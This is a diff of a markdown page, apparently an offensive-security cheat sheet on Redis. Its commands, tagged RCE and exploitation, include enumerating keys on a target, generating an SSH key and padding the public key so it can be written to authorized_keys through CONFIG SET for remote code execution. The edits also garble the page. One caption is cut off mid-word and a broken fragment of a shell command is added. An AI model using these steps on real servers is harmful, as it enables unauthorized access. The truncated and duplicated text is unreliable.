@@ -3,7 +3,7 @@ id: "e1xakua8vmptluy2y"
 title: "redis"
 description: ""
 tags: []
-order: 17
+order: "17"
 createdAt: "2026-05-31T09:56:43.402Z"
 updatedAt: "2026-05-31T09:56:55.559Z"
 ---
@@ -233,7 +233,7 @@ redis-cli -h $TARGET SMEMBERS "key_name"
 ssh-keygen -t rsa -f /tmp/redis_rsa -N ""
 ```
 
-_RCE via SSH Key Write Write attacker SSH public key to authorized_keys via CONFIG SET._
+_RCE via SSH Key Write Write attacker SSH public key to authorized_
 
 **Tags:** redis, rce, ssh, filewrite, exploitation
 <!-- cmd: {"id":"9ztukchuzmptlv3kk","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->
@@ -242,6 +242,8 @@ _RCE via SSH Key Write Write attacker SSH public key to authorized_keys via CONF
 ```bash
 (echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/redis_key.txt
 ```
+
+_rsa.pub; echo -e "\n\n") > /tmp/redis_
 
 **Tags:** redis, rce, ssh, filewrite, exploitation
 <!-- cmd: {"id":"i0xca047gmptlv3ko","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->
